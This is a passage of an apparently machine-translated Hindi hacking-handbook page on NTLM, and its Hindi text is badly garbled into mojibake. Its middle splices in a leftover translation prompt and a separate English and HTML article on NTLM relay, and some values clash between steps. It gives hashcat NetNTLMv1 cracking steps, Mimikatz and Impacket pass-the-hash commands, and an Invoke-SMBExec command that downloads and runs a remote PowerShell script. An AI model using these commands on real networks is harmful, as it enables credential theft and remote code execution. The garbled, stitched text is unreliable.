3. **рдкреБрд╖реНрдЯрд┐ (Authentication)**: рдХреНрд▓рд╛рдЗрдВрдЯ рдЪреБрдиреМрддреА рдХрд╛ рд╕рд╣реА рдЙрддреНрддрд░ рджреЗрддрд╛ рд╣реИ рдФрд░ рд╕рд░реНрд╡рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИред

## рдПрдирдЯреАрдПрд▓рдПрдо рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдЪреБрдиреМрддрд┐рдпрд╛рдБ

рдПрдирдЯреАрдПрд▓рдПрдо рдХреЗ рдХреБрдЫ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдЪреБрдиреМрддрд┐рдпрд╛рдБ рд╣реИрдВ:

1. **рдкрд╛рдареНрдпрдХреНрд░рдо рдЪреБрдиреМрддреА (Pass-the-Hash)**: рдЗрд╕рдореЗрдВ рд╣реИрд╢ рд╡реИрд▓реНрдпреВ рдХреЛ рдЪреБрдиреМрддреА рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рд╣рдореЗрд╢рд╛ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЦрд╛рддреЗ рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
2. **рдПрдирдЯреАрдПрд▓рдПрдо рд░рд┐рд▓реЗ рдЕрдЯреИрдХ (NTLM Relay Attack)**: рдЗрд╕рдореЗрдВ рд╣рдо рдПрдХ рдмреАрдЪрд╡рд╛рд▓рд╛ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдПрдХ рдПрдирдЯреАрдПрд▓рдПрдо рд╕рддреНрдпрд╛рдкрди рд╕рддреНрд░ рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕реЗ рд╣рдо рдЙрд╕ рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
3. **рдПрдирдЯреАрдПрд▓рдПрдо рд▓реАрдХ (NTLM Leak)**: рдЗрд╕рдореЗрдВ рд╣рдо рдПрдирдЯреАрдПрд▓рдПрдо рд╡рд┐рдиреНрдпрд╛рд╕ рдЪрд░рдг рдореЗрдВ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдФрд░ рд╣реИрд╢ рдЕрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЗ рд▓рд┐рдП рдЕрджреНрдпрддрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рдПрдирдЯреАрдПрд▓рдПрдо рд╣рд╛рд░реНрдбрдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЙрдкрд╛рдп

рдПрдирдЯреАрдПрд▓рдПрдо рдХреЛ рд╣рд╛рд░реНрдбрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрдкрд╛рдпреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ:

1. **рд▓реЙрдХрдЖрдЙрдЯ рдиреАрддрд┐ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ**: рд▓реЙрдХрдЖрдЙрдЯ рдиреАрддрд┐ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЕрдЧрд░ рдХреЛрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рд░рдВрддрд░ рдЧрд▓рдд рдкрд╛рд╕рд╡рд░реНрдб рджрд░реНрдЬ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЙрдирдХрд╛ рдЦрд╛рддрд╛ рд▓реЙрдХ рд╣реЛ рдЬрд╛рдПред
2. **NTLMv2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**: NTLMv2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬреЛ рдПрдХ рдмреЗрд╣рддрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкрд╛рдареНрдпрдХреНрд░рдо рдЪреБрдиреМрддреА рдХреЛ рд░реЛрдХрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред
3. **рд▓реЙрдХрдЖрдЙрдЯ рдиреАрддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**: рдирд┐рдпрдорд┐рдд рдЕрдВрддрд░рд╛рд▓ рдкрд░ рд▓реЙрдХрдЖрдЙрдЯ рдиреАрддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЕрджреНрдпрддрд┐рдд рд░рдЦреЗрдВред
4. **рдПрдирдЯреАрдПрд▓рдПрдо рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдЕрджреНрдпрддрд┐рдд рдХрд░реЗрдВ**: рдирд╡реАрдирддрдо рд╕реБрд░рдХреНрд╖рд╛ рдЕрджреНрдпрддрдиреЛрдВ рдХреЗ рд╕рд╛рде рдПрдирдЯреАрдПрд▓рдПрдо рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдЕрджреНрдпрддрд┐рдд рдХрд░реЗрдВ рддрд╛рдХрд┐ рдХрд┐рд╕реА рднреА рдирдИ рд╕реБрд░рдХреНрд╖рд╛ рдЪреБрдиреМрддреА рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗред

## рд╕рдВрдЧреНрд░рд╣реАрдд рдкрд╛рда

рдЗрд╕ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рд╣рдордиреЗ рдПрдирдЯреАрдПрд▓рдПрдо рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХреА рд╣реИ рдФрд░ рд╡рд┐рдВрдбреЛрдЬ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдкрд░ рдПрдирдЯреАрдПрд▓рдПрдо рдХреЛ рд╣рд╛рд░реНрдбрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЛ рд╕рдордЭрд╛рдпрд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдХреГрдкрдпрд╛ рдЗрд╕ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рд╕рдВрджрд░реНрдн рд╕реНрд░реЛрддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
рдпрд╣ рдХрдИ рджрд┐рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣реИрд╢рдХреИрдЯ (hashtopolis рдЬреИрд╕реЗ рдПрдХ рдЯреВрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рддрд░рд┐рдд рдХрд░рдирд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рд╣реИ) рдЪрд▓рд╛рдПрдВред
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдореЗрдВ рдЗрд╕рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдкрддрд╛ рд╣реИ рдЬреЛ password рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдо рдбреЗрдореЛ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджреЗрдВрдЧреЗ:
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
рдЕрдм рд╣рдореЗрдВ рд╣реИрд╢рдХреИрдЯ-рдЙрдкрдпреЛрдЧрд┐рддрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреНрд░реИрдХ рдХрд┐рдП рдЧрдП DES рдХреБрдВрдЬреА рдХреЛ NTLM рд╣реИрд╢ рдХреЗ рднрд╛рдЧ рдореЗрдВ рдмрджрд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
рдЕрдВрдд рдореЗрдВ рдЖрдЦрд┐рд░рдХрд╛рд░ рдЖрдЦрд┐рд░реА рднрд╛рдЧ
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИрдВрдбрдмреБрдХ рд╕реЗ рдПрдХ рд╣реИрдХрд┐рдВрдЧ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕рд╛рдордЧреНрд░реА рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░реА windows-hardening/ntlm/README.md рдлрд╝рд╛рдЗрд▓ рд╕реЗ рд╣реИред рдЕрдВрдЧреНрд░реЗрдЬреА рдореЗрдВ рджрд┐рдП рдЧрдП рдкрд╛рда рдХрд╛ рд╣рд┐рдВрджреА рдореЗрдВ рдЕрдиреБрд╡рд╛рдж рдХрд░реЗрдВ рдФрд░ рдЕрдиреБрд╡рд╛рдж рдХреЛ рд╡рд╣реА рдорд╛рд░реНрдХрдбрд╛рдЙрди рдФрд░ HTML рд╕рд┐рдВрдЯреИрдХреНрд╕ рдХреЗ рд╕рд╛рде рд╡рд╛рдкрд╕ рд▓реМрдЯрд╛рдПрдВред рдХреЛрдб, рд╣реИрдХрд┐рдВрдЧ рддрдХрдиреАрдХ рдХреЗ рдирд╛рдо, рд╣реИрдХрд┐рдВрдЧ рд╢рдмреНрдж, рдХреНрд▓рд╛рдЙрдб / SaaS рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХреЗ рдирд╛рдо (рдЬреИрд╕реЗ Workspace, aws, gcp ...), 'leak' рд╢рдмреНрдж, рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдФрд░ рдорд╛рд░реНрдХрдбрд╛рдЙрди рдЯреИрдЧреНрд╕ рдЬреИрд╕реА рдЪреАрдЬреЗрдВ рдЕрдиреБрд╡рд╛рдж рди рдХрд░реЗрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдЕрддрд┐рд░рд┐рдХреНрдд рдХреБрдЫ рднреА рди рдЬреЛрдбрд╝реЗрдВ, рдХреЗрд╡рд▓ рдЕрдиреБрд╡рд╛рдж рдФрд░ рдорд╛рд░реНрдХрдбрд╛рдЙрди рд╕рд┐рдВрдЯреИрдХреНрд╕ рд░рдЦреЗрдВред

```markdown
# NTLM Relay Attack

The NTLM relay attack is a technique used to exploit the NTLM authentication protocol in Windows environments. It allows an attacker to intercept and relay authentication requests between a client and a target server, gaining unauthorized access to the target system.

## How it works

1. The attacker sets up a rogue server and waits for a client to connect.
2. When the client sends an authentication request to the rogue server, the server relays the request to the target server.
3. The target server responds to the rogue server with an authentication challenge.
4. The rogue server relays the challenge back to the client.
5. The client sends the challenge response to the rogue server, which relays it to the target server.
6. The target server verifies the response and grants access to the rogue server, thinking it is the client.
7. The attacker can now perform actions on the target system using the compromised credentials.

## Mitigation

To protect against NTLM relay attacks, follow these best practices:

- Disable NTLM authentication and use Kerberos or other secure authentication protocols.
- Implement SMB signing to ensure the integrity of SMB communications.
- Enable Extended Protection for Authentication to prevent downgrade attacks.
- Use strong, complex passwords to make it harder for attackers to crack them.
- Regularly update and patch Windows systems to fix any security vulnerabilities.

By following these steps, you can significantly reduce the risk of NTLM relay attacks and enhance the security of your Windows environment.
```

```html
<h1>NTLM Relay Attack</h1>

<p>The NTLM relay attack is a technique used to exploit the NTLM authentication protocol in Windows environments. It allows an attacker to intercept and relay authentication requests between a client and a target server, gaining unauthorized access to the target system.</p>

<h2>How it works</h2>

<ol>
<li>The attacker sets up a rogue server and waits for a client to connect.</li>
<li>When the client sends an authentication request to the rogue server, the server relays the request to the target server.</li>
<li>The target server responds to the rogue server with an authentication challenge.</li>
<li>The rogue server relays the challenge back to the client.</li>
<li>The client sends the challenge response to the rogue server, which relays it to the target server.</li>
<li>The target server verifies the response and grants access to the rogue server, thinking it is the client.</li>
<li>The attacker can now perform actions on the target system using the compromised credentials.</li>
</ol>

<h2>Mitigation</h2>

<p>To protect against NTLM relay attacks, follow these best practices:</p>

<ul>
<li>Disable NTLM authentication and use Kerberos or other secure authentication protocols.</li>
<li>Implement SMB signing to ensure the integrity of SMB communications.</li>
<li>Enable Extended Protection for Authentication to prevent downgrade attacks.</li>
<li>Use strong, complex passwords to make it harder for attackers to crack them.</li>
<li>Regularly update and patch Windows systems to fix any security vulnerabilities.</li>
</ul>

<p>By following these steps, you can significantly reduce the risk of NTLM relay attacks and enhance the security of your Windows environment.</p>
```
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 рдЪреИрд▓реЗрдВрдЬ

**рдЪреИрд▓реЗрдВрдЬ рдХреА рд▓рдВрдмрд╛рдИ 8 рдмрд╛рдЗрдЯ рд╣реЛрддреА рд╣реИ** рдФрд░ **2 рд░рд┐рд╕реНрдкреЙрдиреНрд╕** рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ: рдПрдХ **24 рдмрд╛рдЗрдЯ** рд▓рдВрдмрд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ **рджреВрд╕рд░рд╛** рдХреА рд▓рдВрдмрд╛рдИ **рдЪрд░рдгрд╛рддреНрдордХ** рд╣реЛрддреА рд╣реИред

**рдкрд╣рд▓рд╛ рд░рд┐рд╕реНрдкреЙрдиреНрд╕** рдЙрд╕ **рд╕реНрдЯреНрд░рд┐рдВрдЧ** рдХреЛ **HMAC\_MD5** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЪрд╛рдЗрдлрд░ рдХрд░рдХреЗ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдХреНрд▓рд╛рдЗрдВрдЯ рдФрд░ рдбреЛрдореЗрди** рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ **рдХреБрдВрдЬреА** рдХреЗ рд░реВрдк рдореЗрдВ **NT рд╣реИрд╢** рдХрд╛ **рд╣реИрд╢ MD4** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд┐рд░, **рдкрд░рд┐рдгрд╛рдо** рдХреЛ **рдХреБрдВрдЬреА** рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЪрд╛рдЗрдлрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЪреИрд▓реЗрдВрдЬ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдХреЗ рд▓рд┐рдП, **8 рдмрд╛рдЗрдЯ рдХрд╛ рдХреНрд▓рд╛рдЗрдВрдЯ рдЪреИрд▓реЗрдВрдЬ рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛**ред рдХреБрд▓: 24 Bред

**рджреВрд╕рд░рд╛ рд░рд┐рд╕реНрдкреЙрдиреНрд╕** рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ **рдХрдИ рдорд╛рдиреЛрдВ** рдХрд╛ (рдирдпрд╛ рдХреНрд▓рд╛рдЗрдВрдЯ рдЪреИрд▓реЗрдВрдЬ, **рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк** рд░рд┐рдкреНрд▓реЗ рдЕрдЯреИрдХ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП...)

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ **pcap рд╣реИ рдЬрд┐рд╕рдиреЗ рдПрдХ рд╕рдлрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд┐рдпрд╛ рд╣реИ**, рддреЛ рдЖрдк рдЗрд╕ рдЧрд╛рдЗрдб рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ рдбреЛрдореЗрди, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдЪреИрд▓реЗрдВрдЬ рдФрд░ рд░рд┐рд╕реНрдкреЙрдиреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## рд╣реИрд╢ рдкрд╛рд╕ рдХрд░реЗрдВ

**рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдкреАрдбрд╝рд┐рдд рдХрд╛ рд╣реИрд╢ рд╣реЛрддрд╛ рд╣реИ**, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕реЗ **рдЕрдиреБрдХрд░рдг** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
рдЖрдкрдХреЛ рдПрдХ **рдЯреВрд▓** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ рдЙрд╕ **рд╣реИрд╢** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдХрд░реЗрдЧрд╛**, **рдпрд╛** рдЖрдк рдПрдХ рдирдпрд╛ **рд╕рддреНрд░рд▓реЙрдЧрд┐рди** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ **рд╣реИрд╢** рдХреЛ **LSASS** рдореЗрдВ **рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рдЬрдм рдХреЛрдИ **NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рддреЛ рд╡рд╣ **рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрдЧрд╛**ред рдЖрдЦрд┐рд░реА рд╡рд┐рдХрд▓реНрдк рд╣реИ рд╡рд╣реА рдХрд░рддрд╛ рд╣реИ рдЬреЛ mimikatz рдХрд░рддрд╛ рд╣реИред

**рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рдкрд╛рд╕-рдж-рд╣реИрд╢ рд╣рдорд▓реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

### **Mimikatz**

**рдЗрд╕реЗ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
рдпрд╣ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╢реБрд░реВ рдХрд░реЗрдЧрд╛ рдЬреЛ рдорд┐рдореАрдХреИрдЯреНрд╕ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдирд╛рдо рд╣реЛрдЧреА, рд▓реЗрдХрд┐рди LSASS рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдорд┐рдореАрдХреИрдЯреНрд╕ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рдЕрдВрджрд░ рд╣реЛрдВрдЧреЗред рдлрд┐рд░, рдЖрдк рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ (`runas /netonly` рдЯреНрд░рд┐рдХ рдХреЗ рд╕рдорд╛рди, рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рдкреНрд▓реЗрди-рдЯреЗрдХреНрд╕реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ)ред

### рд▓рд┐рдирдХреНрд╕ рд╕реЗ рдкрд╛рд╕-рдж-рд╣реИрд╢

рдЖрдк рд▓рд┐рдирдХреНрд╕ рд╕реЗ рдкрд╛рд╕-рдж-рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рдВрдбреЛрдЬ рдорд╢реАрдиреЛрдВ рдореЗрдВ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[**рдпрд╣рд╛рдВ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВред**](../../windows/ntlm/broken-reference/)

### Impacket рд╡рд┐рдВрдбреЛрдЬ рдХрдВрдкрд╛рдЗрд▓реНрдб рдЯреВрд▓реНрд╕

рдЖрдк рдпрд╣рд╛рдВ рд╕реЗ рд╡рд┐рдВрдбреЛрдЬ рдХреЗ рд▓рд┐рдП impacket рдмрд╛рдЗрдирд░реА рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдкрдХреЛ рдПрдХ рдХрдорд╛рдВрдб рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреА рд╣реЛрдЧреА, cmd.exe рдФрд░ powershell.exe рдПрдХ рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИрдВ) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* рдФрд░ рднреА рдХрдИ Impacket рдмрд╛рдЗрдирд░реА рд╣реИрдВ...

### Invoke-TheHash

рдЖрдк рдпрд╣рд╛рдВ рд╕реЗ рдкрд╛рд╡рд░рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### рдЗрдирд╡реЛрдХ-рдбрдмреНрд▓реНрдпреВрдПрдордЖрдИрдПрдХреНрд╕реЗрдХреНрдпреВрдЯ

рдпрд╣ рдЯреЗрдХреНрдирд┐рдХ рдПрдХ рдкрд╛рд╡рд░рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рдВрдбреЛрдЬ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдПрдирдЯреАрдПрд▓рдПрдо рдПрдХреНрд╕реЗрдХреНрдпреВрд╢рди рдХреЛ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдЯреЗрдХреНрдирд┐рдХ рдПрдХ рд░рд┐рдореЛрдЯ рдорд╢реАрди рдкрд░ рдПрдХреНрд╕реЗрдХреНрдпреВрд╢рди рдХреЛ рд╕рдВрднрд╡ рдмрдирд╛рддреА рд╣реИ рдЬрдм рдПрдХ рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЙрдкрд▓рдмреНрдз рд╣реЛрддреА рд╣реИрдВред рдпрд╣ рдЯреЗрдХреНрдирд┐рдХ рдПрдХ рдПрдирдЯреАрдПрд▓рдПрдо рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рд░рд┐рдореЛрдЯ рдорд╢реАрди рдкрд░ рднреЗрдЬрддреА рд╣реИред рдЗрд╕ рддрд░реАрдХреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣реИрдХрд░ рд░рд┐рдореЛрдЯ рдорд╢реАрди рдкрд░ рдПрдХреНрд╕реЗрдХреНрдпреВрд╢рди рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг:
```powershell
